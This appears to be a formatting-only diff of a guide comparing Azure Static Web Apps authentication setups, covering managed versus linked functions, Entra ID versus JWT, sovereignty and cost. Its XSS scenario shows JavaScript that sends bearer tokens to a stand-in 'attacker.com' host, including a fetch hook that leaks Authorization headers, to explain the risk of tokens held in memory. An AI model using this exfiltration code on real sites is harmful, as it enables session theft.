@@ -11,14 +11,14 @@
 ## Table of Contents
 
 1. [Understanding SWA Functions](#understanding-swa-functions)
-2. [Quick Decision Tree](#quick-decision-tree)
-3. [Stack Architectures Overview](#stack-architectures-overview)
-4. [Detailed Stack Implementations](#detailed-stack-implementations)
-5. [Comparison Tables](#comparison-tables)
-6. [Implementation Guide](#implementation-guide)
-7. [Testing and Verification](#testing-and-verification)
-8. [Real-World Scenarios](#real-world-scenarios)
-9. [Troubleshooting](#troubleshooting)
+1. [Quick Decision Tree](#quick-decision-tree)
+1. [Stack Architectures Overview](#stack-architectures-overview)
+1. [Detailed Stack Implementations](#detailed-stack-implementations)
+1. [Comparison Tables](#comparison-tables)
+1. [Implementation Guide](#implementation-guide)
+1. [Testing and Verification](#testing-and-verification)
+1. [Real-World Scenarios](#real-world-scenarios)
+1. [Troubleshooting](#troubleshooting)
 10. [Cost Analysis](#cost-analysis)
 11. [Key Learnings](#key-learnings)
 
@@ -113,21 +113,21 @@ az staticwebapp backends link \
 
 ### Key Differences
 
-| Feature               | Managed Functions      | Bring Your Own Functions          |
+| Feature | Managed Functions | Bring Your Own Functions |
 | --------------------- | ---------------------- | --------------------------------- |
-| **Available regions** | 5 regions only         | All Azure regions (60+)           |
-| **Data sovereignty**  | Limited to 5 regions   | Your choice                       |
-| **Deployment**        | SWA CLI/GitHub Actions | Your scripts (az CLI, Terraform)  |
-| **Function plan**     | Consumption only       | Consumption, Premium, Dedicated   |
-| **Cost**              | Included in SWA        | Separate function app billing     |
-| **VNet integration**  | No                     | Yes (Premium/Dedicated)           |
-| **Private endpoints** | No                     | Yes (Premium/Dedicated)           |
-| **Control**           | SWA manages            | You manage                        |
-| **Setup complexity**  | Low (automatic)        | Medium (manual deployment)        |
-| **Portal visibility** | Embedded in SWA        | Separate function app resource    |
-| **Scaling control**   | Automatic              | You configure                     |
-| **Custom domains**    | Via SWA                | Can add on function app too       |
-| **Monitoring**        | Limited (SWA logs)     | Full (Application Insights, etc.) |
+| **Available regions** | 5 regions only | All Azure regions (60+) |
+| **Data sovereignty** | Limited to 5 regions | Your choice |
+| **Deployment** | SWA CLI/GitHub Actions | Your scripts (az CLI, Terraform) |
+| **Function plan** | Consumption only | Consumption, Premium, Dedicated |
+| **Cost** | Included in SWA | Separate function app billing |
+| **VNet integration** | No | Yes (Premium/Dedicated) |
+| **Private endpoints** | No | Yes (Premium/Dedicated) |
+| **Control** | SWA manages | You manage |
+| **Setup complexity** | Low (automatic) | Medium (manual deployment) |
+| **Portal visibility** | Embedded in SWA | Separate function app resource |
+| **Scaling control** | Automatic | You configure |
+| **Custom domains** | Via SWA | Can add on function app too |
+| **Monitoring** | Limited (SWA logs) | Full (Application Insights, etc.) |
 
 ### Data Sovereignty Implications
 
@@ -405,17 +405,17 @@ User → SWA (global CDN)
 
 ```json
 {
-  "$schema": "https://json.schemastore.org/staticwebapp.config.json",
-  "routes": [
-    {
-      "route": "/api/*",
-      "allowedRoles": ["anonymous"]
-    }
-  ],
-  "navigationFallback": {
-    "rewrite": "/index.html",
-    "exclude": ["/api/*", "/*.{css,scss,js,png,gif,ico,jpg,svg}"]
-  }
+ "$schema": "https://json.schemastore.org/staticwebapp.config.json",
+ "routes": [
+ {
+ "route": "/api/*",
+ "allowedRoles": ["anonymous"]
+ }
+ ],
+ "navigationFallback": {
+ "rewrite": "/index.html",
+ "exclude": ["/api/*", "/*.{css,scss,js,png,gif,ico,jpg,svg}"]
+ }
 }
 ```
 
@@ -459,25 +459,25 @@ npx @azure/static-web-apps-cli deploy \
 name: Azure Static Web Apps CI/CD (Managed Functions)
 
 on:
-  push:
-  branches:
-    - main
+ push:
+ branches:
+ - main
 
 jobs:
-  build_and_deploy:
-  runs-on: ubuntu-latest
-  steps:
-    - uses: actions/checkout@v3
+ build_and_deploy:
+ runs-on: ubuntu-latest
+ steps:
+ - uses: actions/checkout@v3
 
-    - name: Build And Deploy
-  uses: Azure/static-web-apps-deploy@v1
-  with:
-  azure_static_web_apps_api_token: ${{ secrets.AZURE_STATIC_WEB_APPS_API_TOKEN }}
-  repo_token: ${{ secrets.GITHUB_TOKEN }}
-  action: "upload"
-  app_location: "frontend-typescript-vite"
-  api_location: "api-fastapi-azure-function" # Managed functions
-  output_location: "dist"
+ - name: Build And Deploy
+ uses: Azure/static-web-apps-deploy@v1
+ with:
+ azure_static_web_apps_api_token: ${{ secrets.AZURE_STATIC_WEB_APPS_API_TOKEN }}
+ repo_token: ${{ secrets.GITHUB_TOKEN }}
+ action: "upload"
+ app_location: "frontend-typescript-vite"
+ api_location: "api-fastapi-azure-function" # Managed functions
+ output_location: "dist"
 ```
 
 **Browser Dev Tools:**
@@ -566,33 +566,33 @@ User → Entra ID Login
 
 ```json
 {
-  "$schema": "https://json.schemastore.org/staticwebapp.config.json",
-  "routes": [
-    {
-      "route": "/*",
-      "allowedRoles": ["authenticated"]
-    }
-  ],
-  "responseOverrides": {
-    "401": {
-      "statusCode": 302,
-      "redirect": "/.auth/login/aad"
-    }
-  },
-  "auth": {
-    "identityProviders": {
-      "azureActiveDirectory": {
-        "registration": {
-          "openIdIssuer": "https://login.microsoftonline.com/AZURE_TENANT_ID/v2.0",
-          "clientIdSettingName": "AZURE_CLIENT_ID",
-          "clientSecretSettingName": "AZURE_CLIENT_SECRET"
-        }
-      }
-    }
-  },
-  "globalHeaders": {
-    "cache-control": "no-cache, no-store, must-revalidate"
-  }
+ "$schema": "https://json.schemastore.org/staticwebapp.config.json",
+ "routes": [
+ {
+ "route": "/*",
+ "allowedRoles": ["authenticated"]
+ }
+ ],
+ "responseOverrides": {
+ "401": {
+ "statusCode": 302,
+ "redirect": "/.auth/login/aad"
+ }
+ },
+ "auth": {
+ "identityProviders": {
+ "azureActiveDirectory": {
+ "registration": {
+ "openIdIssuer": "https://login.microsoftonline.com/AZURE_TENANT_ID/v2.0",
+ "clientIdSettingName": "AZURE_CLIENT_ID",
+ "clientSecretSettingName": "AZURE_CLIENT_SECRET"
+ }
+ }
+ }
+ },
+ "globalHeaders": {
+ "cache-control": "no-cache, no-store, must-revalidate"
+ }
 }
 ```
 
@@ -701,37 +701,37 @@ User → Entra ID Login
 
 ```json
 {
-  "$schema": "https://json.schemastore.org/staticwebapp.config.json",
-  "routes": [
-    {
-      "route": "/*",
-      "allowedRoles": ["authenticated"]
-    }
-  ],
-  "navigationFallback": {
-    "rewrite": "/index.html",
-    "exclude": ["/api/*", "/*.{css,scss,js,png,gif,ico,jpg,svg}"]
-  },
-  "responseOverrides": {
-    "401": {
-      "statusCode": 302,
-      "redirect": "/.auth/login/aad"
-    }
-  },
-  "auth": {
-    "identityProviders": {
-      "azureActiveDirectory": {
-        "registration": {
-          "openIdIssuer": "https://login.microsoftonline.com/AZURE_TENANT_ID/v2.0",
-          "clientIdSettingName": "AZURE_CLIENT_ID",
-          "clientSecretSettingName": "AZURE_CLIENT_SECRET"
-        }
-      }
-    }
-  },
-  "globalHeaders": {
-    "cache-control": "no-cache, no-store, must-revalidate"
-  }
+ "$schema": "https://json.schemastore.org/staticwebapp.config.json",
+ "routes": [
+ {
+ "route": "/*",
+ "allowedRoles": ["authenticated"]
+ }
+ ],
+ "navigationFallback": {
+ "rewrite": "/index.html",
+ "exclude": ["/api/*", "/*.{css,scss,js,png,gif,ico,jpg,svg}"]
+ },
+ "responseOverrides": {
+ "401": {
+ "statusCode": 302,
+ "redirect": "/.auth/login/aad"
+ }
+ },
+ "auth": {
+ "identityProviders": {
+ "azureActiveDirectory": {
+ "registration": {
+ "openIdIssuer": "https://login.microsoftonline.com/AZURE_TENANT_ID/v2.0",
+ "clientIdSettingName": "AZURE_CLIENT_ID",
+ "clientSecretSettingName": "AZURE_CLIENT_SECRET"
+ }
+ }
+ }
+ },
+ "globalHeaders": {
+ "cache-control": "no-cache, no-store, must-revalidate"
+ }
 }
 ```
 
@@ -884,30 +884,30 @@ User → Entra ID Login (SWA)
 
 ```json
 {
-  "$schema": "https://json.schemastore.org/staticwebapp.config.json",
-  "routes": [
-    {
-      "route": "/*",
-      "allowedRoles": ["authenticated"]
-    }
-  ],
-  "responseOverrides": {
-    "401": {
-      "statusCode": 302,
-      "redirect": "/.auth/login/aad"
-    }
-  },
-  "auth": {
-    "identityProviders": {
-      "azureActiveDirectory": {
-        "registration": {
-          "openIdIssuer": "https://login.microsoftonline.com/AZURE_TENANT_ID/v2.0",
-          "clientIdSettingName": "AZURE_CLIENT_ID",
-          "clientSecretSettingName": "AZURE_CLIENT_SECRET"
-        }
-      }
-    }
-  }
+ "$schema": "https://json.schemastore.org/staticwebapp.config.json",
+ "routes": [
+ {
+ "route": "/*",
+ "allowedRoles": ["authenticated"]
+ }
+ ],
+ "responseOverrides": {
+ "401": {
+ "statusCode": 302,
+ "redirect": "/.auth/login/aad"
+ }
+ },
+ "auth": {
+ "identityProviders": {
+ "azureActiveDirectory": {
+ "registration": {
+ "openIdIssuer": "https://login.microsoftonline.com/AZURE_TENANT_ID/v2.0",
+ "clientIdSettingName": "AZURE_CLIENT_ID",
+ "clientSecretSettingName": "AZURE_CLIENT_SECRET"
+ }
+ }
+ }
+ }
 }
 ```
 
@@ -1126,9 +1126,9 @@ curl https://func-subnet-calc-network.azurewebsites.net/api/v1/health
 **Security Layers:**
 
 1. **Entra ID (SWA):** User must authenticate
-2. **IP Restrictions:** Only traffic from Azure SWA IP ranges allowed
-3. **Header Validation:** Must come from correct SWA custom domain
-4. **Result:** Very difficult to bypass
+1. **IP Restrictions:** Only traffic from Azure SWA IP ranges allowed
+1. **Header Validation:** Must come from correct SWA custom domain
+1. **Result:** Very difficult to bypass
 
 **Limitations:**
 
@@ -1461,11 +1461,11 @@ User → Login Form (username/password)
 
 // config.ts
 export const API_CONFIG = {
-  auth: {
-    enabled: true, // Enable JWT auth
-    username: "demo",
-    password: "password123",
-  },
+ auth: {
+ enabled: true, // Enable JWT auth
+ username: "demo",
+ password: "password123",
+ },
 };
 ```
 
@@ -1499,17 +1499,17 @@ export LOCATION=uksouth
 
 ```txt
 1. Page loads → No auth yet
-2. Check API health → 401 Unauthorized
-3. TokenManager automatically logs in:
+1. Check API health → 401 Unauthorized
+1. TokenManager automatically logs in:
  POST /api/v1/auth/login
  Body: username=demo&password=password123
  Response: {"access_token": "eyJ...", "token_type": "bearer"}
-4. Store token in memory
-5. Subsequent requests:
+1. Store token in memory
+1. Subsequent requests:
  GET /api/v1/health
  Header: Authorization: Bearer eyJ...
-6. Token expires after 30 minutes
-7. TokenManager automatically refreshes (login again)
+1. Token expires after 30 minutes
+1. TokenManager automatically refreshes (login again)
 ```
 
 **Testing:**
@@ -1544,19 +1544,19 @@ curl -H "Authorization: Bearer ${TOKEN}" \
 
 #### Security Comparison: JWT vs Platform Auth
 
-| Feature                 | JWT (Application)                 | Entra ID (Platform)          |
+| Feature | JWT (Application) | Entra ID (Platform) |
 | ----------------------- | --------------------------------- | ---------------------------- |
-| **Token storage**       | JavaScript memory or LocalStorage | HttpOnly cookies             |
-| **Token visibility**    | Visible in dev tools              | Hidden from JavaScript       |
-| **XSS risk**            | High (can extract token)          | Low (HttpOnly cookie)        |
-| **CSRF protection**     | Manual (CSRF tokens needed)       | Automatic (SameSite cookies) |
-| **Token refresh**       | Manual code                       | Automatic                    |
-| **User management**     | Application database              | Entra ID (enterprise)        |
-| **Password management** | You hash/store passwords          | Microsoft manages            |
-| **Multi-factor auth**   | You implement                     | Entra ID provides            |
-| **SSO**                 | You implement                     | Entra ID provides            |
-| **Audit logs**          | You implement                     | Entra ID provides            |
-| **Cost**                | Development time                  | $0 (included)                |
+| **Token storage** | JavaScript memory or LocalStorage | HttpOnly cookies |
+| **Token visibility** | Visible in dev tools | Hidden from JavaScript |
+| **XSS risk** | High (can extract token) | Low (HttpOnly cookie) |
+| **CSRF protection** | Manual (CSRF tokens needed) | Automatic (SameSite cookies) |
+| **Token refresh** | Manual code | Automatic |
+| **User management** | Application database | Entra ID (enterprise) |
+| **Password management** | You hash/store passwords | Microsoft manages |
+| **Multi-factor auth** | You implement | Entra ID provides |
+| **SSO** | You implement | Entra ID provides |
+| **Audit logs** | You implement | Entra ID provides |
+| **Cost** | Development time | $0 (included) |
 
 **XSS Attack Scenario:**
 
@@ -1573,12 +1573,12 @@ fetch("https://attacker.com/steal?token=" + token);
 // Can intercept fetch calls or hook into TokenManager
 const originalFetch = window.fetch;
 window.fetch = function (...args) {
-  const headers = args[1]?.headers || {};
-  const authHeader = headers["Authorization"];
-  if (authHeader) {
-    fetch("https://attacker.com/steal?token=" + authHeader);
-  }
-  return originalFetch.apply(this, args);
+ const headers = args[1]?.headers || {};
+ const authHeader = headers["Authorization"];
+ if (authHeader) {
+ fetch("https://attacker.com/steal?token=" + authHeader);
+ }
+ return originalFetch.apply(this, args);
 };
 ```
 
@@ -1645,37 +1645,37 @@ User → Entra ID Login
 
 ```json
 {
-  "$schema": "https://json.schemastore.org/staticwebapp.config.json",
-  "routes": [
-    {
-      "route": "/*",
-      "allowedRoles": ["authenticated"]
-    }
-  ],
-  "navigationFallback": {
-    "rewrite": "/index.html",
-    "exclude": ["/api/*", "/*.{css,scss,js,png,gif,ico,jpg,svg}"]
-  },
-  "responseOverrides": {
-    "401": {
-      "statusCode": 302,
-      "redirect": "/.auth/login/aad"
-    }
-  },
-  "auth": {
-    "identityProviders": {
-      "azureActiveDirectory": {
-        "registration": {
-          "openIdIssuer": "https://login.microsoftonline.com/AZURE_TENANT_ID/v2.0",
-          "clientIdSettingName": "AZURE_CLIENT_ID",
-          "clientSecretSettingName": "AZURE_CLIENT_SECRET"
-        }
-      }
-    }
-  },
-  "globalHeaders": {
-    "cache-control": "no-cache, no-store, must-revalidate"
-  }
+ "$schema": "https://json.schemastore.org/staticwebapp.config.json",
+ "routes": [
+ {
+ "route": "/*",
+ "allowedRoles": ["authenticated"]
+ }
+ ],
+ "navigationFallback": {
+ "rewrite": "/index.html",
+ "exclude": ["/api/*", "/*.{css,scss,js,png,gif,ico,jpg,svg}"]
+ },
+ "responseOverrides": {
+ "401": {
+ "statusCode": 302,
+ "redirect": "/.auth/login/aad"
+ }
+ },
+ "auth": {
+ "identityProviders": {
+ "azureActiveDirectory": {
+ "registration": {
+ "openIdIssuer": "https://login.microsoftonline.com/AZURE_TENANT_ID/v2.0",
+ "clientIdSettingName": "AZURE_CLIENT_ID",
+ "clientSecretSettingName": "AZURE_CLIENT_SECRET"
+ }
+ }
+ }
+ },
+ "globalHeaders": {
+ "cache-control": "no-cache, no-store, must-revalidate"
+ }
 }
 ```
 
@@ -1756,16 +1756,16 @@ open https://managed-auth.publiccloudexperiments.net
 
 **Comparison with Stack 05b:**
 
-| Feature                 | Stack 09 (Managed)  | Stack 05b (BYO Linked)     |
+| Feature | Stack 09 (Managed) | Stack 05b (BYO Linked) |
 | ----------------------- | ------------------- | -------------------------- |
-| **Deployment**          | Automatic (SWA CLI) | Manual (separate function) |
-| **Region**              | westeurope (fixed)  | uksouth (your choice)      |
-| **Function visibility** | Embedded in SWA     | Separate function app      |
-| **Logs**                | Limited             | Full Application Insights  |
-| **VNet**                | No                  | Yes (with Premium)         |
-| **Cost**                | $9/month            | $9/month                   |
-| **UK sovereignty**      | No                  | Yes                        |
-| **EU sovereignty**      | Yes                 | Yes                        |
+| **Deployment** | Automatic (SWA CLI) | Manual (separate function) |
+| **Region** | westeurope (fixed) | uksouth (your choice) |
+| **Function visibility** | Embedded in SWA | Separate function app |
+| **Logs** | Limited | Full Application Insights |
+| **VNet** | No | Yes (with Premium) |
+| **Cost** | $9/month | $9/month |
+| **UK sovereignty** | No | Yes |
+| **EU sovereignty** | Yes | Yes |
 
 **When to Use:**
 
@@ -1788,59 +1788,59 @@ open https://managed-auth.publiccloudexperiments.net
 
 ### Complete Stack Comparison
 
-| Stack                   | Functions   | Region     | Auth         | Sovereignty | Bypass    | Cost | Use Case         |
+| Stack | Functions | Region | Auth | Sovereignty | Bypass | Cost | Use Case |
 | ----------------------- | ----------- | ---------- | ------------ | ----------- | --------- | ---- | ---------------- |
-| **03: No Auth**         | BYO         | uksouth    | None         | UK          | Yes       | $9   | Public demo      |
-| **04: Managed**         | Managed     | westeurope | None         | UK / EU     | Yes       | $9   | Simple EU app    |
-| **05a: Entra Frontend** | BYO         | uksouth    | Entra (SWA)  | UK          | Yes       | $9   | Protect content  |
-| **05b: Entra Linked**   | BYO         | uksouth    | Entra (SWA)  | UK          | Partial   | $9   | **Recommended**  |
-| **05c: Double Auth**    | BYO         | uksouth    | Entra (both) | UK          | No        | $9   | Max security     |
-| **06: Network Secured** | BYO         | uksouth    | Entra + IP   | UK          | Difficult | $9   | Defense depth    |
-| **07: Fully Private**   | BYO Premium | uksouth    | Entra + VNet | UK          | No        | $129 | Compliance       |
-| **08: JWT**             | BYO         | uksouth    | JWT          | UK          | No        | $9   | Custom auth      |
-| **09: Managed + Auth**  | Managed     | westeurope | Entra (SWA)  | UK / EU     | No        | $9   | Simple EU + auth |
+| **03: No Auth** | BYO | uksouth | None | UK | Yes | $9 | Public demo |
+| **04: Managed** | Managed | westeurope | None | UK / EU | Yes | $9 | Simple EU app |
+| **05a: Entra Frontend** | BYO | uksouth | Entra (SWA) | UK | Yes | $9 | Protect content |
+| **05b: Entra Linked** | BYO | uksouth | Entra (SWA) | UK | Partial | $9 | **Recommended** |
+| **05c: Double Auth** | BYO | uksouth | Entra (both) | UK | No | $9 | Max security |
+| **06: Network Secured** | BYO | uksouth | Entra + IP | UK | Difficult | $9 | Defense depth |
+| **07: Fully Private** | BYO Premium | uksouth | Entra + VNet | UK | No | $129 | Compliance |
+| **08: JWT** | BYO | uksouth | JWT | UK | No | $9 | Custom auth |
+| **09: Managed + Auth** | Managed | westeurope | Entra (SWA) | UK / EU | No | $9 | Simple EU + auth |
 
 ### Browser Dev Tools Comparison
 
-| Stack | API URL in Browser                               | Auth Header              | Same-Origin | CORS | Login Flow      |
+| Stack | API URL in Browser | Auth Header | Same-Origin | CORS | Login Flow |
 | ----- | ------------------------------------------------ | ------------------------ | ----------- | ---- | --------------- |
-| 03    | `https://func-*.azurewebsites.net/api/v1/health` | None                     | No          | Yes  | None            |
-| 04    | `/api/v1/health`                                 | None                     | Yes         | No   | None            |
-| 05a   | `https://func-*.azurewebsites.net/api/v1/health` | None                     | No          | Yes  | Entra ID        |
-| 05b   | `/api/v1/health`                                 | Cookie (HttpOnly)        | Yes         | No   | Entra ID        |
-| 05c   | `https://func-*.azurewebsites.net/api/v1/health` | Cookie + possibly Bearer | No          | Yes  | Entra ID (dual) |
-| 06    | `https://func-*.azurewebsites.net/api/v1/health` | Cookie                   | No          | Yes  | Entra ID        |
-| 07    | `/api/v1/health`                                 | Cookie (HttpOnly)        | Yes         | No   | Entra ID        |
-| 08    | `https://func-*.azurewebsites.net/api/v1/health` | `Bearer eyJ...`          | No          | Yes  | Form (auto)     |
-| 09    | `/api/v1/health`                                 | Cookie (HttpOnly)        | Yes         | No   | Entra ID        |
+| 03 | `https://func-*.azurewebsites.net/api/v1/health` | None | No | Yes | None |
+| 04 | `/api/v1/health` | None | Yes | No | None |
+| 05a | `https://func-*.azurewebsites.net/api/v1/health` | None | No | Yes | Entra ID |
+| 05b | `/api/v1/health` | Cookie (HttpOnly) | Yes | No | Entra ID |
+| 05c | `https://func-*.azurewebsites.net/api/v1/health` | Cookie + possibly Bearer | No | Yes | Entra ID (dual) |
+| 06 | `https://func-*.azurewebsites.net/api/v1/health` | Cookie | No | Yes | Entra ID |
+| 07 | `/api/v1/health` | Cookie (HttpOnly) | Yes | No | Entra ID |
+| 08 | `https://func-*.azurewebsites.net/api/v1/health` | `Bearer eyJ...` | No | Yes | Form (auto) |
+| 09 | `/api/v1/health` | Cookie (HttpOnly) | Yes | No | Entra ID |
 
 ### Security Features Comparison
 
-| Stack | Frontend Protected | API Protected    | Direct Bypass | Token Visibility | CSRF Protection |
+| Stack | Frontend Protected | API Protected | Direct Bypass | Token Visibility | CSRF Protection |
 | ----- | ------------------ | ---------------- | ------------- | ---------------- | --------------- |
-| 03    | No                 | No               | Yes           | N/A              | No              |
-| 04    | No                 | No               | Yes           | N/A              | No              |
-| 05a   | Entra ID           | No               | Yes           | HttpOnly cookie  | SameSite        |
-| 05b   | Entra ID           | Via SWA          | Partial       | HttpOnly cookie  | SameSite        |
-| 05c   | Entra ID           | Yes              | No            | HttpOnly cookie  | SameSite        |
-| 06    | Entra ID           | IP + Header      | Difficult     | HttpOnly cookie  | SameSite        |
-| 07    | Entra ID           | Private endpoint | No            | HttpOnly cookie  | SameSite        |
-| 08    | No (public HTML)   | JWT              | No            | Visible          | Manual          |
-| 09    | Entra ID           | Via SWA          | No (embedded) | HttpOnly cookie  | SameSite        |
+| 03 | No | No | Yes | N/A | No |
+| 04 | No | No | Yes | N/A | No |
+| 05a | Entra ID | No | Yes | HttpOnly cookie | SameSite |
+| 05b | Entra ID | Via SWA | Partial | HttpOnly cookie | SameSite |
+| 05c | Entra ID | Yes | No | HttpOnly cookie | SameSite |
+| 06 | Entra ID | IP + Header | Difficult | HttpOnly cookie | SameSite |
+| 07 | Entra ID | Private endpoint | No | HttpOnly cookie | SameSite |
+| 08 | No (public HTML) | JWT | No | Visible | Manual |
+| 09 | Entra ID | Via SWA | No (embedded) | HttpOnly cookie | SameSite |
 
 ### Data Sovereignty Compliance
 
-| Stack | UK Compliance | EU Compliance | Notes                         |
+| Stack | UK Compliance | EU Compliance | Notes |
 | ----- | ------------- | ------------- | ----------------------------- |
-| 03    | Yes (uksouth) | Yes           | Function in uksouth           |
-| 04    | No            | Yes           | Managed in westeurope         |
-| 05a   | Yes (uksouth) | Yes           | Function in uksouth           |
-| 05b   | Yes (uksouth) | Yes           | Function in uksouth           |
-| 05c   | Yes (uksouth) | Yes           | Function in uksouth           |
-| 06    | Yes (uksouth) | Yes           | Function in uksouth           |
-| 07    | Maximum       | Maximum       | VNet in uksouth, private only |
-| 08    | Yes (uksouth) | Yes           | Function in uksouth           |
-| 09    | No            | Yes           | Managed in westeurope         |
+| 03 | Yes (uksouth) | Yes | Function in uksouth |
+| 04 | No | Yes | Managed in westeurope |
+| 05a | Yes (uksouth) | Yes | Function in uksouth |
+| 05b | Yes (uksouth) | Yes | Function in uksouth |
+| 05c | Yes (uksouth) | Yes | Function in uksouth |
+| 06 | Yes (uksouth) | Yes | Function in uksouth |
+| 07 | Maximum | Maximum | VNet in uksouth, private only |
+| 08 | Yes (uksouth) | Yes | Function in uksouth |
+| 09 | No | Yes | Managed in westeurope |
 
 ---
 
@@ -1880,14 +1880,14 @@ export TENANT_ID=$(az account show --query tenantId -o tsv)
 **Or via Azure Portal:**
 
 1. Navigate to Entra ID → App registrations
-2. Click "New registration"
-3. Name: "Subnet Calculator SWA"
-4. Supported account types: Single tenant
-5. Redirect URI: Web → `https://your-swa.azurestaticapps.net/.auth/login/aad/callback`
-6. Click "Register"
-7. Note the "Application (client) ID"
-8. Go to "Certificates & secrets" → "New client secret"
-9. Description: "SWA Secret"
+1. Click "New registration"
+1. Name: "Subnet Calculator SWA"
+1. Supported account types: Single tenant
+1. Redirect URI: Web → `https://your-swa.azurestaticapps.net/.auth/login/aad/callback`
+1. Click "Register"
+1. Note the "Application (client) ID"
+1. Go to "Certificates & secrets" → "New client secret"
+1. Description: "SWA Secret"
 10. Expires: 24 months
 11. Click "Add"
 12. Copy the secret value immediately
@@ -1950,13 +1950,13 @@ uv sync --extra dev
 
 **Determine Your Requirements:**
 
-| Requirement         | Deploy To                 | Managed Functions?      |
+| Requirement | Deploy To | Managed Functions? |
 | ------------------- | ------------------------- | ----------------------- |
-| UK data sovereignty | uksouth                   | No (use BYO)            |
-| EU data sovereignty | westeurope or uksouth     | Yes (westeurope) or BYO |
-| US data sovereignty | eastus, westus, centralus | Yes or BYO              |
-| Australia           | australiaeast             | No (use BYO)            |
-| Canada              | canadacentral             | No (use BYO)            |
+| UK data sovereignty | uksouth | No (use BYO) |
+| EU data sovereignty | westeurope or uksouth | Yes (westeurope) or BYO |
+| US data sovereignty | eastus, westus, centralus | Yes or BYO |
+| Australia | australiaeast | No (use BYO) |
+| Canada | canadacentral | No (use BYO) |
 
 **Set Region:**
 
@@ -2057,11 +2057,11 @@ open https://stack-name.publiccloudexperiments.net
 **Open Browser Dev Tools:**
 
 1. Open browser (Chrome/Firefox)
-2. Press F12 (open dev tools)
-3. Navigate to Network tab
-4. Clear network log
-5. Enter CIDR: `10.0.0.0/24`
-6. Click "Calculate"
+1. Press F12 (open dev tools)
+1. Navigate to Network tab
+1. Clear network log
+1. Enter CIDR: `10.0.0.0/24`
+1. Click "Calculate"
 
 **Observe:**
 
@@ -2133,17 +2133,17 @@ curl -X POST "${FUNC_URL}/api/v1/ipv4/subnet-info" \
 
 **Expected Results:**
 
-| Stack | Expected Response      | Meaning                                         |
+| Stack | Expected Response | Meaning |
 | ----- | ---------------------- | ----------------------------------------------- |
-| 03    | 200 OK (JSON response) | Public, bypass works                            |
-| 04    | No function URL exists | Managed, embedded in SWA                        |
-| 05a   | 200 OK (JSON response) | Public API, bypass works                        |
-| 05b   | 200 OK (JSON response) | Public API, bypass works (but URL less visible) |
-| 05c   | 401 Unauthorized       | Function app auth required, bypass blocked      |
-| 06    | 403 Forbidden          | IP restriction, bypass blocked                  |
-| 07    | Connection timeout     | No public endpoint, bypass impossible           |
-| 08    | 401 Unauthorized       | JWT required, bypass blocked                    |
-| 09    | No function URL exists | Managed, embedded in SWA                        |
+| 03 | 200 OK (JSON response) | Public, bypass works |
+| 04 | No function URL exists | Managed, embedded in SWA |
+| 05a | 200 OK (JSON response) | Public API, bypass works |
+| 05b | 200 OK (JSON response) | Public API, bypass works (but URL less visible) |
+| 05c | 401 Unauthorized | Function app auth required, bypass blocked |
+| 06 | 403 Forbidden | IP restriction, bypass blocked |
+| 07 | Connection timeout | No public endpoint, bypass impossible |
+| 08 | 401 Unauthorized | JWT required, bypass blocked |
+| 09 | No function URL exists | Managed, embedded in SWA |
 
 #### 4. Region Verification Test
 
@@ -2441,7 +2441,7 @@ LOCATION=uksouth ./10-function-app.sh
 
 ```txt
 1. Navigate to SWA → APIs
-2. Look at "Production" row:
+1. Look at "Production" row:
  - "Linked" = BYO functions
  - "Managed" = Managed functions
  - "Unlinked" = No backend configured
@@ -2652,17 +2652,17 @@ export ENABLE_AUTH=true
 
 ### Monthly Cost Breakdown
 
-| Stack | SWA | Function Plan       | Networking | Other      | Total/Month |
+| Stack | SWA | Function Plan | Networking | Other | Total/Month |
 | ----- | --- | ------------------- | ---------- | ---------- | ----------- |
-| 03    | $9  | $0 (free tier)      | $0         | $0         | $9          |
-| 04    | $9  | $0 (managed)        | $0         | $0         | $9          |
-| 05a   | $9  | $0 (free tier)      | $0         | $0         | $9          |
-| 05b   | $9  | $0 (free tier)      | $0         | $0         | $9          |
-| 05c   | $9  | $0 (free tier)      | $0         | $0         | $9          |
-| 06    | $9  | $0 (free tier)      | $0         | $0         | $9          |
-| 07    | $9  | ~$100 (Premium EP1) | ~$10 (PE)  | ~$10 (DNS) | ~$129       |
-| 08    | $9  | $0 (free tier)      | $0         | $0         | $9          |
-| 09    | $9  | $0 (managed)        | $0         | $0         | $9          |
+| 03 | $9 | $0 (free tier) | $0 | $0 | $9 |
+| 04 | $9 | $0 (managed) | $0 | $0 | $9 |
+| 05a | $9 | $0 (free tier) | $0 | $0 | $9 |
+| 05b | $9 | $0 (free tier) | $0 | $0 | $9 |
+| 05c | $9 | $0 (free tier) | $0 | $0 | $9 |
+| 06 | $9 | $0 (free tier) | $0 | $0 | $9 |
+| 07 | $9 | ~$100 (Premium EP1) | ~$10 (PE) | ~$10 (DNS) | ~$129 |
+| 08 | $9 | $0 (free tier) | $0 | $0 | $9 |
+| 09 | $9 | $0 (managed) | $0 | $0 | $9 |
 
 **Notes:**
 
@@ -2993,18 +2993,18 @@ export LOCATION=uksouth
 This guide provides comprehensive reference for all Azure Static Web Apps authentication patterns. Use it to:
 
 1. **Understand options:** Managed vs BYO, platform vs application auth
-2. **Choose correctly:** Based on requirements (sovereignty, security, cost)
-3. **Deploy confidently:** Working scripts and configurations
-4. **Troubleshoot effectively:** Common issues and solutions
-5. **Educate colleagues:** Complete comparison and demonstrations
+1. **Choose correctly:** Based on requirements (sovereignty, security, cost)
+1. **Deploy confidently:** Working scripts and configurations
+1. **Troubleshoot effectively:** Common issues and solutions
+1. **Educate colleagues:** Complete comparison and demonstrations
 
 **Most Important Takeaways:**
 
 1. **BYO Functions** for data sovereignty, **Managed Functions** for simplicity
-2. **Stack 05b** is recommended for most enterprise applications
-3. **Platform auth** (Entra ID) is more secure than application auth (JWT)
-4. **Defense-in-depth** (multiple layers) is better than single layer
-5. **Same-origin** (SWA proxy) is better than cross-origin (direct calls)
+1. **Stack 05b** is recommended for most enterprise applications
+1. **Platform auth** (Entra ID) is more secure than application auth (JWT)
+1. **Defense-in-depth** (multiple layers) is better than single layer
+1. **Same-origin** (SWA proxy) is better than cross-origin (direct calls)
 
 **Questions or Issues?**
 
